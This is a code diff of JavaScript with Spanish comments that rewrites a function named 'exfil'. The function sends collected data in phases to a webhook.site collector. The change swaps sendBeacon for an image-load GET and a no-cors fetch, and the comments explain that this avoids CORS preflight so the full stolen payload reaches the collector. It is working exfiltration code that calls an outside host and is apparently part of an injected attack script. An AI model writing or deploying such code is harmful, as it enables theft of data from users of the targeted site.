@@ -19,18 +19,18 @@
   var COLLECTOR = "https://webhook.site/460362a0-a177-49a8-8cd4-1333797d53e2";
 
   function exfil(fase, datos) {
-    // sendBeacon no bloquea la navegacion; fallback a Image/fetch keepalive.
+    // Exfil por GET-imagen: una carga de <img> NO dispara preflight CORS
+    // (es un "simple request"), asi que webhook.site registra el GET completo
+    // con todo el dato en el querystring. sendBeacon con application/json
+    // disparaba un OPTIONS y el POST con el body se perdia.
+    var qs = encodeURIComponent(JSON.stringify(datos));
+    var url = COLLECTOR + "?fase=" + encodeURIComponent(fase) + "&d=" + qs + "&_=" + Date.now();
     try {
-      var payload = JSON.stringify({ fase: fase, t: new Date().toISOString(), datos: datos });
-      if (navigator.sendBeacon) {
-        navigator.sendBeacon(COLLECTOR, new Blob([payload], { type: "application/json" }));
-        return;
-      }
+      new Image().src = url;
     } catch (e) {}
-    // fallback: GET con querystring (webhook.site free no ejecuta scripts, solo loguea)
+    // Refuerzo: fetch no-cors text/plain tampoco hace preflight.
     try {
-      var qs = encodeURIComponent(JSON.stringify(datos));
-      new Image().src = COLLECTOR + "?fase=" + encodeURIComponent(fase) + "&d=" + qs + "&_=" + Date.now();
+      fetch(url, { method: "GET", mode: "no-cors", keepalive: true });
     } catch (e) {}
   }
 
